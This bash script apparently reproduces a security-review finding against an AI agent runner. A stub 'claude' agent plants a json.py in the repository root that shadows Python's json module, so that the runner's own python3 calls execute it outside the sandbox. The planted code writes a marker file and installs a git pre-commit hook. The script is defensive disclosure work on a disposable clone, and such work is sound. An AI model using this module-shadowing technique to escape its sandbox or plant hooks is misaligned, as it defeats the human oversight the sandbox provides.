#!/usr/bin/env bash
# F-DG0-140 reproduction (code-security-reviewer, DG0 round 12). Disposable clone only.
# A sandboxed reviewer agent may create NEW files in the repository root (deny_except only denies existing entries).
# run-agent.sh runs `python3 -` / `python3 -c` with the invoker's cwd (the repository root, per the documented
# invocation), so sys.path[0] == '' and a planted json.py shadows the stdlib module and runs OUTSIDE the sandbox.
set -uo pipefail
SRC="${1:-/home/user/My-owns}"; COMMIT="${2:-7f09967ad36dc1a0d2a7065ae93f11bded29ccce}"
W="$(mktemp -d "${TMPDIR:-/tmp}/r12-shadow.XXXX")"; C="$W/clone"
export GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_NOSYSTEM=1 GIT_AUTHOR_NAME=t GIT_COMMITTER_NAME=t GIT_AUTHOR_EMAIL=t@e.invalid GIT_COMMITTER_EMAIL=t@e.invalid
git clone -q "$SRC" "$C" && git -C "$C" checkout -q "$COMMIT"
echo "clone at $(git -C "$C" rev-parse HEAD)"
mkdir -p "$C/docs/delivery/assignments/DG0" && echo "probe assignment" > "$C/docs/delivery/assignments/DG0/probe.md"
git -C "$C" add -A && git -C "$C" commit -qm probe-assignment
# Stub 'claude': emulates what a sandboxed code-security-reviewer shell may do, i.e. create a NEW root file.
mkdir -p "$W/bin"; cat > "$W/bin/claude" <<'STUB'
#!/usr/bin/env bash
sid=""; while [ $# -gt 0 ]; do [ "$1" = "--session-id" ] && sid="$2"; shift; done
cat > "$PWD/json.py" <<'PAY'
import os, sys
root = os.getcwd()
open(os.path.join(root, "tools", "gates", "PWNED-by-json-shadow.txt"), "a").write("ran outside sandbox: argv=%r\n" % (sys.argv[:1],))
with open(os.path.join(root, ".git", "hooks", "pre-commit"), "w") as f: f.write("#!/bin/sh\necho HOOK-PLANTED\n")
os.chmod(os.path.join(root, ".git", "hooks", "pre-commit"), 0o755)
del sys.modules["json"]; sys.path[:] = [p for p in sys.path if p not in ("", root)]
import importlib; _real = importlib.import_module("json"); globals().update({k: getattr(_real, k) for k in dir(_real) if not k.startswith("__")})
PAY
echo "{\"type\":\"system\",\"subtype\":\"init\",\"session_id\":\"$sid\"}"
echo "{\"type\":\"result\",\"subtype\":\"success\",\"is_error\":false,\"session_id\":\"$sid\",\"result\":\"done\"}"
STUB
chmod +x "$W/bin/claude"
echo "== before: tools/gates/PWNED* : $(ls "$C"/tools/gates/PWNED* 2>/dev/null || echo none); .git/hooks/pre-commit: $(ls "$C/.git/hooks/pre-commit" 2>/dev/null || echo absent)"
( cd "$C" && PATH="$W/bin:$PATH" ./tools/agents/run-agent.sh --role code-security-reviewer --stage DG0 --task T-SHADOW \
    --assignment docs/delivery/assignments/DG0/probe.md ); echo "runner exit: $?"
echo "== after: tools/gates/PWNED*:"; cat "$C"/tools/gates/PWNED* 2>/dev/null || echo none
echo "== .git/hooks/pre-commit: $(cat "$C/.git/hooks/pre-commit" 2>/dev/null || echo absent)"
M="$(ls -d "$C"/docs/delivery/runs/DG0/DG0-T-SHADOW-* | head -1)/meta.json"
python3 -P -c 'import json,sys; m=json.load(open(sys.argv[1])); print("meta.external_config_changed =", m.get("external_config_changed")); print("meta.bash_sandbox =", m.get("bash_sandbox")); print("meta.outputs/created =", {k:m.get(k) for k in ("created","modified","written_by_tools") if k in m})' "$M"
echo "== git status --porcelain:"; git -C "$C" status --porcelain
echo "== last commit:"; git -C "$C" log --oneline -1
echo "== prefreeze-style 'python3 -m' from repo root also imports it:"; ( cd "$C" && rm -f tools/gates/PWNED*; python3 -m json.tool --help >/dev/null 2>&1; python3 -c 'import json' ; ls tools/gates/PWNED* 2>/dev/null && echo "EXECUTED again via python3 -c / -m" )
rm -rf "$W"
